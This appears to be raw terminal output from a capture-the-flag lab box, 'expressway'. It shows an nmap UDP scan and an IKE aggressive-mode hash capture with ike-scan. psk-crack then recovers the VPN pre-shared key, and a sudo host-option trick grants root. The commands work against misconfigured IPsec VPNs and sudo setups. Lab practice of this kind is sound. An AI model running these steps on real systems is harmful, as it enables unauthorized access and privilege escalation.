
```
kali@kali ~> nmap -sU -sC -sV -T4 10.129.81.15                                                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 18:23 UTC
Warning: 10.129.81.15 giving up on port because retransmission cap hit (6).
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 6.30% done; ETC: 18:31 (0:07:11 remaining)
Stats: 0:01:59 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 15.17% done; ETC: 18:36 (0:11:05 remaining)
Nmap scan report for 10.129.81.15
Host is up (0.079s latency).  
Not shown: 981 closed udp ports (port-unreach)
PORT      STATE         SERVICE        VERSION
9/udp     open|filtered discard
68/udp    open|filtered dhcpc
69/udp    open          tftp           Netkit tftpd or atftpd
500/udp   open          isakmp?  
| fingerprint-strings:         
|   IKE_MAIN_MODE:         
|_    "3DUfw                   
| ike-version:                 
|   attributes:                
|     XAUTH                    
|_    Dead Peer Detection v1.0 
682/udp   open|filtered xfr    
903/udp   open|filtered ideafarm-panic
1039/udp  open|filtered sbl                                                                                                                                                                                                                  
1058/udp  open|filtered nim                                                                                           
1701/udp  open|filtered L2TP                                                                                          
4500/udp  open|filtered nat-t-ike                                                                                     
17077/udp open|filtered unknown                                                                                       
19541/udp open|filtered jcp                                                                                           
21186/udp open|filtered unknown                                                                                       
24511/udp open|filtered unknown                                                                                       
30718/udp open|filtered unknown                                                                                       
34422/udp open|filtered unknown                                                                                       
48189/udp open|filtered unknown                                                                                       
49161/udp open|filtered unknown                                                                                       
49208/udp open|filtered unknown                                                                                       

```



```
kali@kali ~/t/ikeforce (master)> ike-scan -A --pskcrack 10.129.81.15                                                  
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)                                     
10.129.81.15    Aggressive Mode Handshake returned HDR=(CKY-R=7ad88cc38edd04b4) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@
expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
                                                                                                                      
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):                                             
752f84aaaee5f395e2c2c105fc538249eef68b1a9e1ac920930518f0f5614ef4c1e8ad030b3b7f736dd68879b4f27103df639fcdd6ffc84594b955a0009328da69a14a96b3ffa041d27909389adf36fadc49b786ece9ca164ff21f36e8e373e41762ce15e02faa78b25f93e59f62767b37a6ac80a8afc
a72a086f855ff06b919:09109e41ccd68a8049e6610202598ee75154032610f882eb84cffb371dd5c7b3c4b7373d67caee0f34307bc6cd596315c75d2f310af0bb20e67fb1e235eb473d30bcaa42d13f59deda3a31b8d1a30fdedd8019563eb73ac25b7fcd39cc048ed7f66ad79c154148c9bf9c6cd23
d1830d46f162002dcb607580414fc22b94b427f:7ad88cc38edd04b4:f3693010086c40ec:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000
c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:76ec020c66da2a75c1a6f6a940ff47bda6
de591f:847010d42c079a19fd36b5044482df58977446c8a5693773530acebc8f197e48:79d26764f559d59c612dd598a158dd31cd58182e
```



```
kali@kali ~/t/ikeforce (master) [1]> psk-crack hashfile.txt -d=/usr/share/wordlists/rockyou.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 79d26764f559d59c612dd598a158dd31cd58182e
Ending psk-crack: 8045040 iterations in 9.858 seconds (816051.45 iterations/sec)

```



```
ike@expressway:~$ find / -group proxy -type d 2>/dev/null
/run/squid
/var/spool/squid
/var/log/squid

```





```
ike@expressway:~$ find / -group proxy -type d 2>/dev/null                                                                                                                                                                                    
/run/squid                                                                                                            
/var/spool/squid                                                                                                      
/var/log/squid                                                                                                        
ike@expressway:~$ cd /var/log/squid                                                                                   
ike@expressway:/var/log/squid$ ls                                                                                     
access.log.1  access.log.2.gz  cache.log.1  cache.log.2.gz                                                            



```



```
ike@expressway:/var/log/squid$ cat access.log.1                                                                                                                                                                                              
1753229566.990      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -                                                                                                                                   

1753229688.902      0 192.168.68.50 NONE_NONE/000 0 - error:transaction-end-before-headers - HIER_NONE/- -
1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html <------


```

```
ike@expressway:/var/log/squid$ sudo -l -h offramp.expressway.htb
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL

```


```

```